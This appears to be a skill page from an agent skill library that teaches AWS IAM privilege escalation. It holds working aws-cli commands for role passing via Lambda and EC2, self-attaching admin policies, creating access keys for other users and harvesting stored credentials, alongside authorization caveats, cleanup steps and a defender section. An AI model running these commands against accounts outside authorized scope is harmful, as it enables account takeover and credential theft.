@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: iam-privesc</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>iam-privesc</h2><div class="meta"><span class="badge gray">cloud</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when assessing AWS IAM privilege escalation paths during</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="aws-enumeration.html">aws-enumeration</a> <a href="cloud-security-basics.html">cloud-security-basics</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>aws-cli</td><td>2.22</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>IAM privilege escalation is the path from a low-privilege AWS credential to administrative control of the account. The primitives are well known: pass a powerful role to a new Lambda function or EC2 instance, attach a stronger policy to yourself, create a new policy version, or hop through assumable roles. This skill covers the authorized operator workflow: enumerate effective permissions, identify which primitives are available, execute the escalation safely in your own account or lab, and document the path. Use it against your own accounts, in-scope bug bounty targets, and lab environments only. Never escalate on accounts you do not have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Enumerate the starting principal: ARN, attached and inline</li>
+<p>policies, groups, and trust relationships.</p>
+<li>Resolve EFFECTIVE permissions with SimulatePrincipalPolicy for</li>
+<p>the escalation-relevant actions (do not trust policy names).</p>
+<li>List assumable roles: read trust policies and test</li>
+<p><code>sts:AssumeRole</code> where allowed.</p>
+<li>Match permissions against the known primitives below and pick</li>
+<p>the quietest path first.</p>
+<li>Execute the escalation in your own account or lab, then confirm</li>
+<p>with <code>sts get-caller-identity</code> and a harmless privileged read.</p>
+<li>Record the full chain: starting ARN, permissions used, commands</li>
+<p>run, resulting ARN.</p>
+<li>Clean up every resource you created (functions, instances,</li>
+<p>policy versions, keys).</p>
+<li>Report the path with the exact commands so the defender can</li>
+<p>reproduce and fix it.</p>
+</ol>
+<h2>1. Effective permission enumeration</h2>
+<p>Policy names lie; simulation tells the truth. Test the actions you plan to use before building the attack.</p>
+<pre><code class="language-bash">ME=$(aws sts get-caller-identity --query Arn --output text)
+echo &quot;starting principal: $ME&quot;
+
+# Simulate the escalation-relevant actions in one call
+aws iam simulate-principal-policy --policy-source-arn &quot;$ME&quot; \
+  --action-names iam:PassRole lambda:CreateFunction lambda:UpdateFunctionCode \
+    ec2:RunInstances iam:CreatePolicyVersion iam:AttachUserPolicy \
+    iam:AttachRolePolicy sts:AssumeRole iam:CreateAccessKey \
+    iam:PutUserPolicy iam:UpdateAssumeRolePolicy \
+  --query &#x27;EvaluationResults[].[EvalActionName,EvalDecision]&#x27; --output text</code></pre>
+<p>Also enumerate the raw policies so you can read conditions and resource scoping that simulation summarizes:</p>
+<pre><code class="language-bash"># Inline and attached policies for the current user (adjust for roles)
+aws iam list-user-policies --user-name &lt;USER&gt; --query &#x27;PolicyNames&#x27; --output text
+aws iam get-user-policy --user-name &lt;USER&gt; --policy-name &lt;POLICY&gt; \
+  --query &#x27;PolicyDocument&#x27;</code></pre>
+<h2>2. AssumeRole chains</h2>
+<pre><code class="language-bash"># Roles whose trust policy names your principal (needs iam:GetRole per role)
+for r in $(aws iam list-roles --query &#x27;Roles[].RoleName&#x27; --output text); do
+  trust=$(aws iam get-role --role-name &quot;$r&quot; \
+    --query &#x27;Role.AssumeRolePolicyDocument&#x27; --output text 2&gt;/dev/null)
+  echo &quot;$r :: $(echo &quot;$trust&quot; | head -c 120)&quot;
+done
+
+# Attempt the assume (only where the trust policy allows it)
+aws sts assume-role --role-arn arn:aws:iam::&lt;ACCT&gt;:role/&lt;ROLE&gt; \
+  --role-session-name test 2&gt;&amp;1 | head -20</code></pre>
+<p>Each assumed role is a NEW principal: re-run section 1 under the new credentials, because the new role may unlock further hops.</p>
+<h2>3. Primitive: PassRole plus Lambda</h2>
+<p><code>iam:PassRole</code> plus <code>lambda:CreateFunction</code> (or <code>lambda:UpdateFunctionCode</code> on an existing function) lets you run code as any role you are allowed to pass.</p>
+<pre><code class="language-bash"># Confirm the two halves
+aws iam simulate-principal-policy --policy-source-arn &quot;$ME&quot; \
+  --action-names iam:PassRole lambda:CreateFunction \
+  --query &#x27;EvaluationResults[].[EvalActionName,EvalDecision]&#x27; --output text
+
+# Which roles can you pass? Check the resource scope on iam:PassRole
+aws iam get-user-policy --user-name &lt;USER&gt; --policy-name &lt;POLICY&gt; \
+  --query &#x27;PolicyDocument.Statement[?Action==`iam:PassRole`]&#x27;
+
+# Lab-only execution sketch: create a function with the target role
+# zip function.zip index.py   (handler runs aws sts get-caller-identity)
+aws lambda create-function --function-name privesc-test \
+  --runtime python3.12 --role arn:aws:iam::&lt;ACCT&gt;:role/&lt;TARGET-ROLE&gt; \
+  --handler index.handler --zip-file fileb://function.zip
+aws lambda invoke --function-name privesc-test /tmp/out.json \
+  &amp;&amp; cat /tmp/out.json
+
+# Cleanup is mandatory
+aws lambda delete-function --function-name privesc-test</code></pre>
+<h2>4. Primitive: PassRole plus EC2</h2>
+<p><code>iam:PassRole</code> plus <code>ec2:RunInstances</code> (with <code>iam:CreateInstanceProfile</code> and <code>iam:AddRoleToInstanceProfile</code>, or an existing profile) puts the target role&#x27;s credentials on an instance you control.</p>
+<pre><code class="language-bash"># Create an instance profile holding the target role (lab only)
+aws iam create-instance-profile --instance-profile-name test-profile
+aws iam add-role-to-instance-profile \
+  --instance-profile-name test-profile --role-name &lt;TARGET-ROLE&gt;
+sleep 10  # propagation delay is real
+
+aws ec2 run-instances --image-id ami-&lt;ID&gt; --instance-type t3.micro \
+  --iam-instance-profile Name=test-profile \
+  --user-data file:///tmp/userdata.sh --query &#x27;Instances[0].InstanceId&#x27;
+
+# From inside the instance, the role credentials appear in metadata
+# (same IMDS calls as the aws-enumeration skill, section 1)
+
+# Cleanup is mandatory
+aws ec2 terminate-instances --instance-ids &lt;ID&gt;
+aws iam remove-role-from-instance-profile \
+  --instance-profile-name test-profile --role-name &lt;TARGET-ROLE&gt;
+aws iam delete-instance-profile --instance-profile-name test-profile</code></pre>
+<h2>5. Primitive: policy attachment and versioning</h2>
+<p>Direct policy edits are the shortest path when allowed.</p>
+<pre><code class="language-bash"># Attach the managed AdministratorAccess policy to yourself
+aws iam attach-user-policy --user-name &lt;USER&gt; \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Or create a new ADMIN policy version on a policy you can already use
+aws iam create-policy-version \
+  --policy-arn arn:aws:iam::&lt;ACCT&gt;:policy/&lt;POLICY&gt; \
+  --policy-document file:///tmp/admin.json --set-as-default
+
+# Inline policy version (no new managed policy needed)
+aws iam put-user-policy --user-name &lt;USER&gt; --policy-name escalate \
+  --policy-document file:///tmp/admin.json</code></pre>
+<p>Where <code>/tmp/admin.json</code> is <code>{&quot;Version&quot;:&quot;2012-10-17&quot;,&quot;Statement&quot;: [{&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:&quot;*&quot;,&quot;Resource&quot;:&quot;*&quot;}]}</code>. Use only in your own account or lab, and remove the policy or version afterwards.</p>
+<h2>6. Primitive: credential creation</h2>
+<pre><code class="language-bash"># Create an access key for a more powerful user you can administer
+aws iam create-access-key --user-name &lt;TARGET-USER&gt; \
+  --query &#x27;AccessKey.{ID:AccessKeyId, Secret:SecretAccessKey}&#x27; --output text
+
+# Update an existing login profile or attach a policy, then revert
+aws iam attach-role-policy --role-name &lt;ROLE&gt; \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</code></pre>
+<p>Treat created credentials like live ammunition: use once, confirm, delete immediately with <code>aws iam delete-access-key</code>.</p>
+<h2>7. Reading the trust policy for hidden doors</h2>
+<pre><code class="language-bash"># Who can assume this role? Look for * principals and loose conditions
+aws iam get-role --role-name &lt;ROLE&gt; \
+  --query &#x27;Role.AssumeRolePolicyDocument&#x27; | python3 -m json.tool
+
+# Red flags: Principal &quot;*&quot;, or Condition with aws:PrincipalArn * ,
+# or sts:ExternalId missing on third-party roles</code></pre>
+<h2>8. Full-chain documentation template</h2>
+<p>For the report, record each hop as: starting ARN, permission that enabled the hop, exact command, resulting ARN, cleanup command. A chain of three hops is three findings, not one; each hop is a place the defender can break the chain.</p>
+<h2>Edge cases</h2>
+<ul>
+<li><code>iam:PassRole</code> is scoped to specific role ARNs: you can only</li>
+<p>pass the listed roles, so enumerate the resource field, not just the action.</p>
+<li>IAM changes take time to propagate (usually seconds, sometimes</li>
+<p>minutes). If a fresh policy does not seem to work, wait and retry before concluding it failed.</p>
+<li><code>simulate-principal-policy</code> does not evaluate resource-based</li>
+<p>policies or trust policies: a simulated Allow on <code>sts:AssumeRole</code> still needs the role&#x27;s trust policy to name you. Test the real call.</p>
+<li>Permissions boundaries and SCPs can silently deny an action</li>
+<p>that the identity policy allows; simulation flags some of these, real calls confirm the rest.</p>
+<li><code>lambda:UpdateFunctionCode</code> needs an EXISTING function you can</li>
+<p>write to: list functions first and check each function&#x27;s own resource policy.</p>
+<li>In labs with <code>iam:CreatePolicyVersion</code>, the policy may already</li>
+<p>have five versions (the maximum): delete the oldest non-default version first with <code>iam:DeletePolicyVersion</code>.</p>
+<li>Session policies on assumed roles can strip permissions the</li>
+<p>role would otherwise grant; check how the role was assumed.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No direct primitives: pivot to AssumeRole chains (section 2).</li>
+<p>Each hop re-rolls your permissions; enumerate again every hop.</p>
+<li>Role trust requires <code>sts:ExternalId</code> you do not know: look for</li>
+<p>the ID in code repos, CI variables, or documentation inside the scope; never brute force it.</p>
+<li>Blocked at IAM entirely: look at the data plane. Secrets</li>
+<p>Manager, SSM Parameter Store, and Lambda environment variables often hold credentials for OTHER principals with more power (read-only access may be enough, subject to scope).</p>
+<li>EC2 user-data scripts and Lambda environment variables are</li>
+<p>readable with <code>ec2:DescribeInstances</code> and <code>lambda:GetFunctionConfiguration</code>: harvest them for embedded credentials before attempting noisier primitives.</p>
+<li>Glue, SageMaker, and CloudFormation can also execute code as a</li>
+<p>passed role (<code>iam:PassRole</code> + <code>glue:CreateDevEndpoint</code>, <code>sagemaker:CreateNotebookInstance</code>, <code>cloudformation:CreateStack</code>): check simulation for those actions when Lambda and EC2 are denied.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see IAM privilege escalation in CloudTrail management events: <code>AttachUserPolicy</code>, <code>CreatePolicyVersion</code>, <code>PutUserPolicy</code>, <code>CreateAccessKey</code>, <code>AssumeRole</code>, and <code>UpdateAssumeRolePolicy</code>, each with caller ARN and source IP. GuardDuty raises <code>PrivilegeEscalation:IAMUser/AdministrativePermissions</code> when a user grants themselves administrative rights, plus <code>Persistence:IAMUser/*</code> findings for new keys and policies. Durable defenses are permissions boundaries on every human and CI role, SCPs that deny <code>iam:*</code> outside a break-glass OU, requiring MFA for IAM write actions, alerts on policy attachment and access key creation, and regular access reviews of trust policies. As the tester, execute escalations only in your own account or lab unless the scope explicitly allows production, clean up everything you create, and never leave a backdoor policy, key, or user behind.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1484 (Domain Policy Modification): policy</li>
+<p>attachment and version abuse.</p>
+<li>MITRE ATT&amp;CK T1134 (Access Token Manipulation): AssumeRole and</li>
+<p>credential hopping.</p>
+<li>MITRE ATT&amp;CK T1098.001 (Account Manipulation: Additional Cloud</li>
+<p>Credentials): creating access keys.</p>
+<li>MITRE ATT&amp;CK T1078.004 (Valid Accounts: Cloud Accounts): using</li>
+<p>the escalated identity.</p>
+<li>Rhino Security Labs AWS privilege escalation research (the</li>
+<p>classic 21-method taxonomy this skill&#x27;s primitives follow).</p>
+<li>AWS IAM SimulatePrincipalPolicy:</li>
+<p>https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_testing-iam.html</p>
+<li>AWS IAM best practices:</li>
+<p>https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
